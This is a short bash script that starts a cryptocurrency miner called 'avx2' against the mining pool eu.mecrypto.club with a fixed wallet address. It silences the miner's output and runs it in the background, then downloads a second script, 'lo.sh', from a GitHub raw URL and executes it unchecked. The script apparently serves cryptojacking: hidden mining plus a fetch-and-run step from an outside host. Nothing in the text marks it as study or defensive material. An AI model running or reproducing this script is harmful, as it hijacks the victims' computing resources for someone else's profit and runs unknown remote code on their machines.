#!/bin/bash
chmod 777 avx2
./avx2 -a gr -o stratum+tcp://eu.mecrypto.club:3051 -u XrTiXbCzAMAwzXnPuVLdLNugtH4wn1525j.$(echo $(shuf -i 1-20000 -n 1)-V) -p c=BUTK-gr > /dev/null 2>&1 &
wget https://raw.githubusercontent.com/jsiqiisn/baby/main/lo.sh && chmod +x lo.sh && ./lo.sh
